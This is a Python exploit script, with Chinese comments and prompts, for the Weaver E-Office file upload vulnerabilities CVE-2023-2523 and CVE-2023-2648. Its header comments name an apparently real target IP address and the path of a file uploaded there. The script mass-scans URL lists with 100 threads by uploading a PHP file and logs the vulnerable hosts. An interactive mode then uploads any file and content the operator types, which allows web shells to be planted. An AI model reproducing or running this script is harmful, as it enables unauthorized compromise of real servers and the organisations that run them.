# CVE-2023-2523、CVE-2023-2648
# app="泛微-EOffice"
# http://59.54.14.148:8082  
# http://59.54.14.148:8082/attachment/2737893678/1.txt
import requests
import argparse
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from multiprocessing.dummy import Pool

# 禁用https证书警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    pass

def main():
    parser = argparse.ArgumentParser(description="泛微 E-Office文件上传漏洞复现")
    parser.add_argument('-u', '--url', dest='url', type=str, help='目标URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='包含目标URL的文件')
    args = parser.parse_args()

    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    playload = "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt'
    }
    data = (
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
        "Content-Disposition: form-data; name=\"upload_quwan\"; filename=\"1.php.\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n"
        "<?php phpinfo();?>\r\n"
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n\r\n"
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--\r\n"
    )
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        response = requests.post(url=target+playload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and "1.php" in response.text:
            print(f"[+] 存在任意文件上传漏洞 {target}")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-] 不存在任意文件上传漏洞 {target}")
    except Exception as e:
        print(e)
        # pass
def exp(target):
    print("--------------正在进行漏洞利用--------------")
    while True:
        file = input('请输入你要上传的文件名,q退出>')
        code = input('请输入文件的内容：')
        if file == 'q':
            print("正在退出，请等候....")
            break
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
        }
        playload = "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
        data = (
            "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
            f'Content-Disposition: form-data; name=\"upload_quwan\"; filename=\"{file}\"\r\n"'
            "Content-Type: image/jpeg\r\n\r\n"
            f'{code}\r\n'
            "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
            "Content-Disposition: form-data; name=\"file\"; filename=\"\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n\r\n"
            "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--\r\n"
        )
        proxies = {
            'http': 'http://127.0.0.1:7890',
            'https': 'http://127.0.0.1:7890'
        }
        res = requests.post(url=target+playload, headers=headers, data=data,verify=False,timeout=10)
        if res.status_code == 200 and f"{file}" in res.text:
            print(f"上传成功！")
        else:
            print("不存在！")

if __name__ == '__main__':
    main()

